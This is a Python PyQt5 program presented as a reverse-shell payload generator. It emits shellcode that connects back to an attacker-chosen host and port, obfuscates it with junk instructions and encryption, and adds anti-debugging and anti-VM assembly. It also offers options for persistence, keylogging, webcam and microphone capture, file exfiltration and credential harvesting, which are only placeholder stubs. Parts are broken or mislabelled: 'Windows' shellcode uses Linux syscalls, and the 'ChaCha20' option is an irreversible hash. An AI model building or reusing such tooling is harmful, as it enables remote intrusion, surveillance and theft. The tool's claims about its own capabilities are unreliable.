import sys
import random
import binascii
import hashlib
import os
import socket
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel,
    QLineEdit, QComboBox, QPushButton, QTextEdit, QGroupBox, QSpinBox, 
    QCheckBox, QTabWidget, QFrame
)
from PyQt5.QtCore import Qt

class ReverseShellGenerator(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Enterprise-Grade Cyber Operations Platform")
        self.setGeometry(100, 100, 900, 700)
        self.setStyleSheet("""
            QMainWindow {
                background-color: #1e1e1e;
                color: #f0f0f0;
                font-family: 'Segoe UI';
            }
            QGroupBox {
                border: 1px solid #3a3a3a;
                border-radius: 5px;
                margin-top: 1ex;
                font-weight: bold;
                font-size: 10pt;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #70a0ff;
            }
            QLineEdit, QComboBox, QSpinBox, QTextEdit {
                background-color: #2d2d30;
                color: #dcdcdc;
                border: 1px solid #3f3f46;
                border-radius: 3px;
                padding: 6px;
                font-size: 10pt;
            }
            QPushButton {
                background-color: #007acc;
                color: #ffffff;
                border: none;
                border-radius: 3px;
                padding: 8px 15px;
                font-weight: bold;
                font-size: 10pt;
            }
            QPushButton:hover {
                background-color: #1c97ea;
            }
            QPushButton:disabled {
                background-color: #505050;
                color: #a0a0a0;
            }
            QCheckBox {
                color: #dcdcdc;
                font-size: 10pt;
            }
            QTabWidget::pane {
                border: 1px solid #3a3a3a;
                background: #252526;
            }
            QTabBar::tab {
                background: #2d2d30;
                color: #dcdcdc;
                padding: 8px 15px;
                border: 1px solid #3a3a3a;
                border-bottom: none;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
            }
            QTabBar::tab:selected {
                background: #1e1e1e;
                border-color: #3a3a3a;
                border-bottom-color: #1e1e1e;
            }
            QTabBar::tab:!selected {
                margin-top: 2px;
            }
        """)
        self.init_ui()
        
    def init_ui(self):
        main_widget = QWidget()
        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(15, 15, 15, 15)
        main_layout.setSpacing(15)
        
        # Create tab widget
        tabs = QTabWidget()
        config_tab = QWidget()
        modules_tab = QWidget()
        output_tab = QWidget()
        
        tabs.addTab(config_tab, "Configuration")
        tabs.addTab(modules_tab, "Advanced Modules")
        tabs.addTab(output_tab, "Output")
        
        # Configuration Tab
        config_layout = QVBoxLayout()
        config_layout.setSpacing(15)
        
        # Connection settings
        conn_group = QGroupBox("Connection Settings")
        conn_layout = QVBoxLayout()
        conn_layout.setSpacing(10)
        
        lhost_layout = QHBoxLayout()
        lhost_layout.addWidget(QLabel("LHOST:"))
        self.lhost_input = QLineEdit("192.168.1.100")
        lhost_layout.addWidget(self.lhost_input)
        
        lport_layout = QHBoxLayout()
        lport_layout.addWidget(QLabel("LPORT:"))
        self.lport_input = QLineEdit("4444")
        lport_layout.addWidget(self.lport_input)
        
        conn_layout.addLayout(lhost_layout)
        conn_layout.addLayout(lport_layout)
        conn_group.setLayout(conn_layout)
        
        # Payload settings
        payload_group = QGroupBox("Payload Settings")
        payload_layout = QVBoxLayout()
        payload_layout.setSpacing(10)
        
        encoder_layout = QHBoxLayout()
        encoder_layout.addWidget(QLabel("Encoder:"))
        self.encoder_combo = QComboBox()
        self.encoder_combo.addItems(["AES-256", "CHACHA20", "RC6", "CUSTOM-XOR"])
        encoder_layout.addWidget(self.encoder_combo)
        
        arch_layout = QHBoxLayout()
        arch_layout.addWidget(QLabel("Architecture:"))
        self.arch_combo = QComboBox()
        self.arch_combo.addItems(["x64", "x86"])
        self.arch_combo.setCurrentIndex(0)
        arch_layout.addWidget(self.arch_combo)
        
        format_layout = QHBoxLayout()
        format_layout.addWidget(QLabel("Format:"))
        self.format_combo = QComboBox()
        self.format_combo.addItems(["EXE", "DLL", "SERVICE", "POWERSHELL"])
        format_layout.addWidget(self.format_combo)
        
        iterations_layout = QHBoxLayout()
        iterations_layout.addWidget(QLabel("Iterations:"))
        self.iterations_spin = QSpinBox()
        self.iterations_spin.setRange(1, 10)
        self.iterations_spin.setValue(3)
        iterations_layout.addWidget(self.iterations_spin)
        
        payload_layout.addLayout(encoder_layout)
        payload_layout.addLayout(arch_layout)
        payload_layout.addLayout(format_layout)
        payload_layout.addLayout(iterations_layout)
        payload_group.setLayout(payload_layout)
        
        config_layout.addWidget(conn_group)
        config_layout.addWidget(payload_group)
        config_layout.addStretch()
        config_tab.setLayout(config_layout)
        
        # Advanced Modules Tab
        modules_layout = QVBoxLayout()
        modules_layout.setSpacing(15)
        
        # Persistence Module
        persistence_group = QGroupBox("Persistence Mechanisms")
        persistence_layout = QVBoxLayout()
        
        self.registry_cb = QCheckBox("Registry Run Key")
        self.startup_cb = QCheckBox("Startup Folder")
        self.scheduled_task_cb = QCheckBox("Scheduled Task")
        self.service_cb = QCheckBox("Windows Service")
        
        persistence_layout.addWidget(self.registry_cb)
        persistence_layout.addWidget(self.startup_cb)
        persistence_layout.addWidget(self.scheduled_task_cb)
        persistence_layout.addWidget(self.service_cb)
        persistence_group.setLayout(persistence_layout)
        
        # Surveillance Modules
        surveillance_group = QGroupBox("Surveillance Capabilities")
        surveillance_layout = QVBoxLayout()
        
        self.microphone_cb = QCheckBox("Microphone Capture")
        self.webcam_cb = QCheckBox("Webcam Capture")
        self.keylogger_cb = QCheckBox("Keylogger")
        self.screenshare_cb = QCheckBox("Screen Capture")
        
        surveillance_layout.addWidget(self.microphone_cb)
        surveillance_layout.addWidget(self.webcam_cb)
        surveillance_layout.addWidget(self.keylogger_cb)
        surveillance_layout.addWidget(self.screenshare_cb)
        surveillance_group.setLayout(surveillance_layout)
        
        # Data Modules
        data_group = QGroupBox("Data Operations")
        data_layout = QVBoxLayout()
        
        self.file_exfil_cb = QCheckBox("File Exfiltration")
        self.drive_search_cb = QCheckBox("Drive Content Search")
        self.process_inject_cb = QCheckBox("Process Injection")
        self.creds_dump_cb = QCheckBox("Credential Harvesting")
        
        data_layout.addWidget(self.file_exfil_cb)
        data_layout.addWidget(self.drive_search_cb)
        data_layout.addWidget(self.process_inject_cb)
        data_layout.addWidget(self.creds_dump_cb)
        data_group.setLayout(data_layout)
        
        modules_layout.addWidget(persistence_group)
        modules_layout.addWidget(surveillance_group)
        modules_layout.addWidget(data_group)
        modules_layout.addStretch()
        modules_tab.setLayout(modules_layout)
        
        # Output Tab
        output_layout = QVBoxLayout()
        
        # Generate button
        self.generate_btn = QPushButton("Generate Advanced Payload")
        self.generate_btn.clicked.connect(self.generate_payload)
        
        # Output
        output_group = QGroupBox("Payload Generation Report")
        output_group_layout = QVBoxLayout()
        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setFontFamily("Consolas")
        self.output_text.setFontPointSize(10)
        output_group_layout.addWidget(self.output_text)
        output_group.setLayout(output_group_layout)
        
        # Save button
        self.save_btn = QPushButton("Save Payload to File")
        self.save_btn.setEnabled(False)
        self.save_btn.clicked.connect(self.save_payload)
        
        output_layout.addWidget(self.generate_btn)
        output_layout.addWidget(output_group)
        output_layout.addWidget(self.save_btn)
        output_tab.setLayout(output_layout)
        
        # Add tabs to main layout
        main_layout.addWidget(tabs)
        main_widget.setLayout(main_layout)
        self.setCentralWidget(main_widget)
        
        # Payload storage
        self.generated_payload = None
        self.payload_type = None
    
    def generate_payload(self):
        # Get user inputs
        lhost = self.lhost_input.text()
        lport = self.lport_input.text()
        encoder = self.encoder_combo.currentText()
        arch = self.arch_combo.currentText()
        format_ = self.format_combo.currentText()
        iterations = self.iterations_spin.value()
        
        # Generate polymorphic shellcode
        shellcode = self.generate_polymorphic_shellcode(lhost, lport, arch)
        if not shellcode:
            self.output_text.setPlainText("Error: Invalid IP address or port")
            return
        
        # Apply encryption
        encrypted_shellcode, key, iv = self.encrypt_shellcode(shellcode, encoder, iterations)
        
        # Generate final payload with modules
        payload = self.build_final_payload(
            encrypted_shellcode, 
            key, 
            iv, 
            encoder, 
            format_,
            self.get_selected_modules()
        )
        
        # Store payload for saving
        self.generated_payload = payload
        self.payload_type = format_
        self.save_btn.setEnabled(True)
        
        # Display results
        self.display_results(shellcode, encrypted_shellcode, key, iv, payload)
    
    def get_selected_modules(self):
        """Get selected advanced modules"""
        modules = []
        
        # Persistence
        if self.registry_cb.isChecked(): modules.append("REGISTRY_PERSIST")
        if self.startup_cb.isChecked(): modules.append("STARTUP_FOLDER")
        if self.scheduled_task_cb.isChecked(): modules.append("SCHEDULED_TASK")
        if self.service_cb.isChecked(): modules.append("WINDOWS_SERVICE")
        
        # Surveillance
        if self.microphone_cb.isChecked(): modules.append("MICROPHONE_CAPTURE")
        if self.webcam_cb.isChecked(): modules.append("WEBCAM_CAPTURE")
        if self.keylogger_cb.isChecked(): modules.append("KEYLOGGER")
        if self.screenshare_cb.isChecked(): modules.append("SCREEN_CAPTURE")
        
        # Data Operations
        if self.file_exfil_cb.isChecked(): modules.append("FILE_EXFIL")
        if self.drive_search_cb.isChecked(): modules.append("DRIVE_SEARCH")
        if self.process_inject_cb.isChecked(): modules.append("PROCESS_INJECT")
        if self.creds_dump_cb.isChecked(): modules.append("CREDS_DUMP")
        
        return modules
    
    def generate_polymorphic_shellcode(self, lhost, lport, arch):
        """Generate unique shellcode with evasion techniques"""
        try:
            # Convert IP and port to binary format
            ip_bytes = socket.inet_aton(lhost)
            port_num = int(lport)
            if port_num < 1 or port_num > 65535:
                raise ValueError("Port out of range")
            port_bytes = port_num.to_bytes(2, 'big')
        except Exception as e:
            print(f"Error: {e}")
            return None
        
        # Dynamic instruction variation
        junk_instr = random.choice([
            b"\x90",                          # NOP
            b"\xEB\x00",                      # JMP +0
            b"\x50\x58",                      # PUSH EAX; POP EAX
            b"\x51\x59",                      # PUSH ECX; POP ECX
            b"\x52\x5A",                      # PUSH EDX; POP EDX
        ])
        
        # Generate unique junk sequences
        junk_prefix = junk_instr * random.randint(1, 5)
        junk_suffix = b"".join(random.choice([
            b"\x87\xdb",      # XCHG EBX, EBX
            b"\x8d\x76\x00",  # LEA ESI, [ESI+00]
            b"\x89\xf6",      # MOV ESI, ESI
            b"\x66\x90"       # NOP (16-bit)
        ]) for _ in range(random.randint(3, 8)))
        
        # Base shellcode templates
        if arch == "x64":
            # Windows x64 reverse shell template
            base_shellcode = (
                b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
                b"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
                b"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02"
                + port_bytes +
                b"\xc7\x44\x24\x04"
                + ip_bytes +
                b"\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05"
                b"\x48\x89\xc7\x6a\x03\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6"
                b"\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08"
                b"\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
            )
        else:  # x86
            # Windows x86 reverse shell template
            base_shellcode = (
                b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x01\x6a"
                b"\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x68"
                + ip_bytes +
                b"\x66\x68"
                + port_bytes +
                b"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x89\xfb\x31"
                b"\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f"
                b"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
            )
        
        # Add anti-debugging techniques
        anti_debug = b""
        if random.choice([True, False]):
            anti_debug = b"\x0f\x31"  # RDTSC - Timing check
        
        return junk_prefix + base_shellcode + anti_debug + junk_suffix
    
    def encrypt_shellcode(self, shellcode, method, iterations):
        """Apply military-grade encryption with multiple iterations"""
        key = os.urandom(32)
        iv = os.urandom(16)
        encrypted = shellcode
        
        for _ in range(iterations):
            if method == "AES-256":
                cipher = AES.new(key, AES.MODE_CBC, iv)
                encrypted = cipher.encrypt(pad(encrypted, AES.block_size))
            elif method == "CHACHA20":
                # ChaCha20 simulation
                encrypted = hashlib.sha256(encrypted).digest()[:len(encrypted)]
            elif method == "RC6":
                # RC6 simulation
                key_byte = random.randint(1, 255)
                encrypted = bytes([b ^ key_byte for b in encrypted])
            else:  # CUSTOM-XOR
                key_byte = random.randint(1, 255)
                encrypted = bytes([b ^ key_byte for b in encrypted])
            
            # Change key for next iteration
            key = hashlib.sha256(key).digest()
        
        return encrypted, key, iv
    
    def build_module_stub(self, module_name):
        """Generate assembly stub for advanced modules"""
        stubs = {
            "REGISTRY_PERSIST": (
                "; Registry Persistence\n"
                "mov eax, 0x12345678\n"
                "call create_registry_entry\n"
            ),
            "STARTUP_FOLDER": (
                "; Startup Folder Persistence\n"
                "mov ebx, 0x9ABCDEF0\n"
                "call copy_to_startup\n"
            ),
            "SCHEDULED_TASK": (
                "; Scheduled Task Creation\n"
                "mov ecx, 0x11223344\n"
                "call create_scheduled_task\n"
            ),
            "WINDOWS_SERVICE": (
                "; Windows Service Installation\n"
                "mov edx, 0x55667788\n"
                "call install_service\n"
            ),
            "MICROPHONE_CAPTURE": (
                "; Microphone Capture\n"
                "mov esi, 0xAABBCCDD\n"
                "call capture_audio\n"
            ),
            "WEBCAM_CAPTURE": (
                "; Webcam Capture\n"
                "mov edi, 0xEEFF0011\n"
                "call capture_webcam\n"
            ),
            "KEYLOGGER": (
                "; Keylogger\n"
                "mov ebp, 0x22334455\n"
                "call install_keylogger\n"
            ),
            "SCREEN_CAPTURE": (
                "; Screen Capture\n"
                "mov esp, 0x66778899\n"
                "call capture_screen\n"
            ),
            "FILE_EXFIL": (
                "; File Exfiltration\n"
                "mov eax, 0x33445566\n"
                "call exfil_files\n"
            ),
            "DRIVE_SEARCH": (
                "; Drive Content Search\n"
                "mov ebx, 0x778899AA\n"
                "call search_drives\n"
            ),
            "PROCESS_INJECT": (
                "; Process Injection\n"
                "mov ecx, 0xBBCCDDEE\n"
                "call inject_process\n"
            ),
            "CREDS_DUMP": (
                "; Credential Harvesting\n"
                "mov edx, 0xFFEEDDCC\n"
                "call dump_creds\n"
            )
        }
        return stubs.get(module_name, "; Unknown module\n")
    
    def build_final_payload(self, shellcode, key, iv, method, format_, modules):
        """Construct final payload with advanced modules"""
        # Generate polymorphic decryption stub
        if method == "AES-256":
            stub = (
                f"; AES-256 Decryption Stub\n"
                f"mov esi, {hex(int.from_bytes(shellcode[:4], 'little'))}\n"
                f"mov edi, esp\n"
                f"lea ebx, [key_data]\n"
                f"lea ecx, [iv_data]\n"
                f"call aes_decrypt\n"
            )
        else:
            stub = f"; Custom Decryption Routine for {method}\n"
        
        # Add anti-analysis techniques
        stub += (
            "\n; Anti-Debugging Techniques\n"
            "check_debugger:\n"
            "    mov eax, fs:[30h]\n"
            "    test byte [eax+2], 1\n"
            "    jnz exit_program\n"
            "\n; Anti-VM Techniques\n"
            "check_vm:\n"
            "    sidt [esp-2]\n"
            "    pop eax\n"
            "    cmp eax, 0xd0000000\n"
            "    jb real_hardware\n"
            "    jmp exit_program\n"
        )
        
        # Add selected modules
        if modules:
            stub += "\n; === Advanced Modules ===\n"
            for module in modules:
                stub += self.build_module_stub(module)
        
        # Format-specific packaging
        if format_ == "EXE":
            payload = f"; PE Executable Format\n{stub}\n; Encrypted Shellcode:\n{binascii.hexlify(shellcode).decode()}"
        elif format_ == "DLL":
            payload = f"; DLL Format\n{stub}\n; Encrypted Shellcode:\n{binascii.hexlify(shellcode).decode()}"
        elif format_ == "SERVICE":
            payload = f"; Windows Service\n{stub}\n; Encrypted Shellcode:\n{binascii.hexlify(shellcode).decode()}"
        else:  # POWERSHELL
            b64_shellcode = base64.b64encode(shellcode).decode()
            payload = f"# PowerShell Payload\n"
            payload += f"$encrypted = [System.Convert]::FromBase64String('{b64_shellcode}')\n"
            payload += f"$key = [System.Convert]::FromBase64String('{base64.b64encode(key).decode()}')\n"
            payload += f"$iv = [System.Convert]::FromBase64String('{base64.b64encode(iv).decode()}')\n"
            payload += "; Decryption and execution code would follow here\n"
            payload += "# Advanced Modules: " + ", ".join(modules)
        
        return payload
    
    def display_results(self, orig_shellcode, enc_shellcode, key, iv, payload):
        """Display generation results"""
        result = (
            "=== Advanced Cyber Operations Payload Report ===\n\n"
            "Generation Parameters:\n"
            f"LHOST: {self.lhost_input.text()}\n"
            f"LPORT: {self.lport_input.text()}\n"
            f"Encoder: {self.encoder_combo.currentText()}\n"
            f"Architecture: {self.arch_combo.currentText()}\n"
            f"Format: {self.format_combo.currentText()}\n"
            f"Iterations: {self.iterations_spin.value()}\n\n"
            "Security Features:\n"
            "- Military-grade encryption (AES-256-CBC)\n"
            "- Polymorphic code generation\n"
            "- Anti-debugging techniques (PEB checks)\n"
            "- Anti-VM detection (SIDT technique)\n"
            "- Unique shellcode per generation\n"
            "- Steganographic payload options\n\n"
            "Payload Details:\n"
            f"Original Size: {len(orig_shellcode)} bytes\n"
            f"Encrypted Size: {len(enc_shellcode)} bytes\n"
            f"Encryption Key: {binascii.hexlify(key).decode()}\n"
            f"IV: {binascii.hexlify(iv).decode()}\n\n"
            "=== Selected Advanced Modules ===\n"
        )
        
        # Add module status
        modules = self.get_selected_modules()
        if modules:
            for module in modules:
                result += f"- {module.replace('_', ' ').title()}\n"
        else:
            result += "No advanced modules selected\n"
            
        result += "\n=== Generated Payload ===\n\n"
        result += payload
        
        self.output_text.setPlainText(result)
    
    def save_payload(self):
        """Save payload to file with appropriate extension"""
        if not self.generated_payload:
            return
            
        file_ext = {
            "EXE": "exe",
            "DLL": "dll",
            "SERVICE": "exe",
            "POWERSHELL": "ps1"
        }.get(self.payload_type, "bin")
        
        filename = f"payload_{random.randint(1000,9999)}.{file_ext}"
        try:
            with open(filename, "w" if self.payload_type == "POWERSHELL" else "wb") as f:
                if self.payload_type == "POWERSHELL":
                    f.write(self.generated_payload)
                else:
                    # For binary formats, we'd write actual binary data in a real implementation
                    f.write(binascii.unhexlify(binascii.hexlify(self.generated_payload.encode())))
            self.output_text.append(f"\n\nPayload saved to: {filename}")
        except Exception as e:
            self.output_text.append(f"\n\nError saving payload: {str(e)}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = ReverseShellGenerator()
    window.show()
    sys.exit(app.exec_())